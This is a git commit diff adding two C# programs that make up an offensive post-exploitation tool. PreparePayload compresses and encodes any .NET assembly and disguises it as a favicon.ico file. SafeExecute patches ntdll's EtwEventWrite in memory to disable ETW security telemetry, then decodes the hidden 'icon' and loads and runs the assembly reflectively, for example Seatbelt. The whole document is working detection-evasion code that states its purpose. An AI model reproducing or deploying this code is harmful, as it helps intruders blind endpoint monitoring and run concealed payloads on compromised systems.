0d6cfeff9f34afe8a7abb7f01fa795ccea70eed9
meckazin <meckazin@kissa.io>
2020-08-30 21:33:39 +0300

    Initial commit

---
+++ PreparePayload/Program.cs
@@ -0,0 +1,227 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Text;
+
+namespace PreparePayload
+{
+    class Program
+    {
+        /// <summary>
+        /// Manipulates the given assembly so it can be loaded by the Execute-Assembly-Safe
+        /// </summary>
+        /// <param name="assemblyPath">Path to target assembly</param>
+        /// <param name="destinationPath">Path to PathcETW projects favicon.ico</param>
+        public static void Main(string[] args)
+        {
+            try
+            {
+                if (args.Count() != 2)
+                    throw new Exception("You must give both arguments: Target Assembly and the path to Execute-Assembly-Safe favicon.ico!");
+
+                string assemblyPath = args[0];
+                string destinationPath = args[1];
+
+                if (assemblyPath == null || assemblyPath == "")
+                {
+                    throw new Exception("You must give a path to the executable you wan't to use!");
+                }
+                if (destinationPath == null || destinationPath == "")
+                {
+                    throw new Exception("You must give a path where the manipulated assembly shall be written!");
+                }
+
+                if (!File.Exists(assemblyPath) || (File.GetAttributes(assemblyPath) & FileAttributes.Directory) == FileAttributes.Directory)
+                {
+                    throw new Exception($"Given path was invalid! Path was: {assemblyPath}");
+                }
+
+                //Read binary
+                Console.WriteLine($"[+] Reading target binary: {assemblyPath}");
+                byte[] assemblyBin = File.ReadAllBytes(assemblyPath);
+
+                if (assemblyBin == null || assemblyBin.Length <= 1)
+                {
+                    throw new Exception($"Unable to read file from path: {assemblyPath}");
+                }
+
+                //deflate
+                byte[] compressed = Helper.deflateCompress(assemblyBin);
+
+                //Base64 encode
+                string encoded = Convert.ToBase64String(compressed);
+
+                //Compress and write out
+                Helper.gZIPCompress(encoded, destinationPath);
+                Console.WriteLine($"[+] Wrote the manipulated assembly file to: {destinationPath}");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error: {e.Message}");
+            }
+            finally
+            {
+                Console.Write("Press enter key to exit");
+                Console.ReadLine();
+            }
+            
+        }
+    }
+
+    /// <summary>
+    /// Taken from NoAmci project: https://github.com/med0x2e/NoAmci
+    /// </summary>
+    static class Helper
+    {
+        public static byte[] deflateCompress(byte[] data)
+        {
+            byte[] compressedArray = null;
+            try
+            {
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
+                    {
+                        deflateStream.Write(data, 0, data.Length);
+                    }
+                    compressedArray = memoryStream.ToArray();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Deflate Compress Error: " + ex.Message);
+                return null;
+            }
+            return compressedArray;
+        }
+        public static void gZIPCompress(string assembly, string destinationFile)
+        {
+
+            byte[] buffer = null;
+            MemoryStream sourceStream = null;
+            FileStream destinationStream = null;
+            GZipStream compressedStream = null;
+            try
+            {
+
+                byte[] assemblyBytes = Encoding.UTF8.GetBytes(assembly);
+                sourceStream = new MemoryStream(assemblyBytes);
+
+                buffer = new byte[sourceStream.Length];
+                int checkCounter = sourceStream.Read(buffer, 0, buffer.Length);
+                if (checkCounter != buffer.Length)
+                {
+                    throw new ApplicationException();
+                }
+
+                destinationStream = new FileStream(destinationFile, FileMode.OpenOrCreate, FileAccess.Write);
+                compressedStream = new GZipStream(destinationStream, CompressionMode.Compress, true);
+                compressedStream.Write(buffer, 0, buffer.Length);
+            }
+            catch (ApplicationException ex)
+            {
+                Console.WriteLine("Error occured during compression" + ex.Message);
+            }
+            finally
+            {
+                if (sourceStream != null)
+                    sourceStream.Close();
+
+                if (compressedStream != null)
+                    compressedStream.Close();
+
+                if (destinationStream != null)
+                    destinationStream.Close();
+            }
+        }
+
+        public static byte[] deflateDecompress(byte[] data)
+        {
+            byte[] decompressedArray = null;
+            try
+            {
+                using (MemoryStream decompressedStream = new MemoryStream())
+                {
+                    using (MemoryStream compressStream = new MemoryStream(data))
+                    {
+                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
+                        {
+                            deflateStream.CopyTo(decompressedStream);
+                        }
+                    }
+                    decompressedArray = decompressedStream.ToArray();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("\nDeflate Compress Error: " + ex.Message);
+                return null;
+            }
+
+            return decompressedArray;
+        }
+        public static byte[] gzipDecompress(Stream sourceStream)
+        {
+
+            GZipStream decStream = null;
+            byte[] tempBuffer = null;
+
+            try
+            {
+
+                decStream = new GZipStream(sourceStream, CompressionMode.Decompress, true);
+
+                tempBuffer = new byte[4];
+                int position = (int)sourceStream.Length - 4;
+                sourceStream.Position = position;
+
+                sourceStream.Read(tempBuffer, 0, 4);
+
+                sourceStream.Position = 0;
+
+                int length = BitConverter.ToInt32(tempBuffer, 0);
+                byte[] buffer = new byte[length + 100];
+                int offset = 0;
+
+                while (true)
+                {
+                    int bytesRead = decStream.Read(buffer, offset, 100);
+
+                    if (bytesRead == 0)
+                        break;
+
+                    offset += bytesRead;
+                }
+
+                return buffer;
+            }
+            catch (ApplicationException ex)
+            {
+                Console.WriteLine("Error occured during decompression" + ex.Message);
+                return null;
+            }
+
+            finally
+            {
+                if (sourceStream != null)
+                    sourceStream.Close();
+
+                if (decStream != null)
+                    decStream.Close();
+            }
+        }
+        public static void CopyTo(this Stream source, Stream destination, int bufferSize = 81920)
+        {
+            byte[] array = new byte[bufferSize];
+            int count;
+            while ((count = source.Read(array, 0, array.Length)) != 0)
+            {
+                destination.Write(array, 0, count);
+            }
+        }
+
+
+    }
+}
---
+++ SafeExecute/Program.cs
@@ -0,0 +1,273 @@
+﻿using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.IO.Compression;
+
+namespace SafeExecute
+{
+    public static class Program
+    {
+        class Win32
+        {
+            [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string name);
+
+            [DllImport("kernel32")]
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        }
+
+        /// <summary>
+        /// Patches ETW EventWrite function to return immediately to evade ETW detection while using Execute-Assembly
+        /// Expected parameters are:
+        /// Namespace
+        /// Optional MethodName
+        /// Optional Arguments
+        /// 
+        /// Example: SafeExecute.exe seatbelt.program main
+        /// </summary>
+        /// <param name="args"></param>
+        public static void Main(string[] args)
+        {
+            string nameSpace = "";
+            string methodName = "";
+            string arg = "";
+            try
+            {
+                if (args.Count() < 1 || args[0] == null || args[0] == "")
+                    throw new Exception("Not enough arguments given! You must specify at least assembly namespace!");
+
+                if (args.Count() == 1 || (args[1] == null || args[1] == ""))
+                {
+                    Console.WriteLine("[+] No method name was given, setting method name to \"main\" ");
+                    methodName = "main";
+                }
+                else
+                {
+                    methodName = args[1];
+                }
+
+
+                if (args.Count() <= 2)
+                    arg = "";
+                else
+                    arg = args[2];
+
+                nameSpace = args[0];
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error while parsing arguments!: {e.Message}");
+                return;
+            }
+
+            try
+            {
+                Console.WriteLine("[+] Detecting os arch");
+
+                if (is64B())
+                {
+                    Console.WriteLine("[+] Selected x64");
+                    Console.WriteLine("[+] Attempting to patch EtwEventWrite with instruction c30000");
+                    //Patch x64
+                    Patch(new byte[] { 0xc3, 0x00, 0x00 });
+                }
+                else
+                {
+                    Console.WriteLine("[+] Selected x86");
+                    Console.WriteLine("[+] Attempting to patch EtwEventWrite with instruction c21400");
+                    // Patch x86
+                    Patch(new byte[] { 0xc2, 0x14, 0x00 });
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error while patching EtwEventWrite!: {e.Message}");
+                throw;
+            }
+
+            try
+            {
+                //Payload code from from NoAmci project: https://github.com/med0x2e/NoAmci
+                // favicon.ico is an encoded and compressed version of the set assembly using DeflateStream and GzipStream APIs.
+                //Maybe encrypt the stream with the target domain name (As postex tool we should know it...)
+                Assembly assembly = Assembly.GetExecutingAssembly();
+                Stream stream = assembly.GetManifestResourceStream("SafeExecute.favicon.ico");
+
+                string decCompressedAssembly = Encoding.Default.GetString(gzipDecompress(stream));
+                decCompressedAssembly = decCompressedAssembly.Replace("\0", string.Empty);
+                byte[] decoded = Convert.FromBase64String(decCompressedAssembly);
+                byte[] assemblyBin = deflateDecompress(decoded);
+
+                //string[] args = { @"" };
+                ExecuteTheThing(assemblyBin, nameSpace, methodName, new string[] { arg });
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error while executing assembly!: {e.Message}");
+                throw;
+            }
+
+            Console.Write("Press enter key to exit");
+            Console.ReadLine();
+        }
+
+        private static void ExecuteTheThing(byte[] bytes, string typeName, string methodName, string[] args)
+        {
+            try
+            {
+                Assembly assembly = Assembly.Load(bytes);
+
+                Type type = assembly.GetTypes().FirstOrDefault(x => x.FullName.ToLower().Equals(typeName.ToLower()));
+                if (type == null)
+                {
+                    throw new Exception($"Given typename: {typeName} was not found!");
+                }
+
+                MethodInfo method = type.GetMethods().FirstOrDefault(x => x.Name.ToLower().Equals(methodName.ToLower()));
+                if (method == null)
+                {
+                    throw new Exception($"Given method: {methodName} was not found!");
+                }
+
+                object instance = Activator.CreateInstance(type);
+
+                //Automatically fix the case where method expects no parameters and an empty string was given
+                ParameterInfo[] parameters = method.GetParameters();
+                method.Invoke(instance, (parameters.Count() == 0 && args[0] == "") ? null : new object[] { args });
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error: {e.Message}");
+                return;
+            }
+        }
+
+        //Code taken from https://blog.xpnsec.com/hiding-your-dotnet-etw/
+        private static void Patch(byte[] patch)
+        {
+            try
+            {
+                IntPtr ntdll = Win32.LoadLibrary("ntdll.dll");
+                IntPtr etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+                uint oldProtect;
+                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+                Console.WriteLine($"[+] Original value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
+                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+                Console.WriteLine($"[+] New value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
+            }
+            catch
+            {
+                Console.WriteLine("Error unhooking ETW");
+            }
+        }
+        //Stolen from NoAmci
+        private static byte[] deflateDecompress(byte[] data)
+        {
+            byte[] decompressedArray = null;
+            try
+            {
+                using (MemoryStream decompressedStream = new MemoryStream())
+                {
+                    using (MemoryStream compressStream = new MemoryStream(data))
+                    {
+                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
+                        {
+                            deflateStream.CopyTo(decompressedStream);
+                        }
+                    }
+                    decompressedArray = decompressedStream.ToArray();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("\nDeflate Compress Error: " + ex.Message);
+                return null;
+            }
+
+            return decompressedArray;
+        }
+        //Stolen from NoAmci
+        private static byte[] gzipDecompress(Stream sourceStream)
+        {
+
+            GZipStream decStream = null;
+            byte[] tempBuffer = null;
+
+            try
+            {
+
+                decStream = new GZipStream(sourceStream, CompressionMode.Decompress, true);
+
+                tempBuffer = new byte[4];
+                int position = (int)sourceStream.Length - 4;
+                sourceStream.Position = position;
+
+                sourceStream.Read(tempBuffer, 0, 4);
+
+                sourceStream.Position = 0;
+
+                int length = BitConverter.ToInt32(tempBuffer, 0);
+                byte[] buffer = new byte[length + 100];
+                int offset = 0;
+
+                while (true)
+                {
+                    int bytesRead = decStream.Read(buffer, offset, 100);
+
+                    if (bytesRead == 0)
+                        break;
+
+                    offset += bytesRead;
+                }
+
+                return buffer;
+            }
+            catch (ApplicationException ex)
+            {
+                Console.WriteLine("Error occured during decompression" + ex.Message);
+                return null;
+            }
+
+            finally
+            {
+                if (sourceStream != null)
+                    sourceStream.Close();
+
+                if (decStream != null)
+                    decStream.Close();
+            }
+        }
+
+        //Stolen from NoAmci
+        private static bool is64B()
+        {
+            bool is64B = true;
+
+            if (IntPtr.Size == 4)
+                is64B = false;
+
+            return is64B;
+        }
+
+        //Stolen from NoAmci
+        public static void CopyTo(this Stream source, Stream destination, int bufferSize = 81920)
+        {
+            byte[] array = new byte[bufferSize];
+            int count;
+            while ((count = source.Read(array, 0, array.Length)) != 0)
+            {
+                destination.Write(array, 0, count);
+            }
+        }
+    }
+}
